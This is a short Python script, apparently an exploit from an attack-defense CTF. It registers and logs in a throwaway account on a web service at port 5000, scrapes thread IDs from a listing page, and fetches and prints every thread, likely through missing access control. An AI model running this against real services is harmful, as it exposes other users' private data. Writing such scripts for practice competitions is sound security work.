import requests
import sys
import re

ip = sys.argv[1]

r = requests.post(f"http://{ip}:5000/register", data={ 'login': 'fl3x', 'password': 'any_password' })

s = requests.Session()

s.post(f"http://{ip}:5000/login", data={ 'login': 'fl3x', 'password': 'any_password' })

r = s.get(f"http://{ip}:5000/list")

threads = re.findall('''<a href="/threads/(.{1,4})">Thread_.+</a>''', r.text)

for i in threads:
    r = s.get(f"http://{ip}:5000/threads/{i}")
    print(r.text)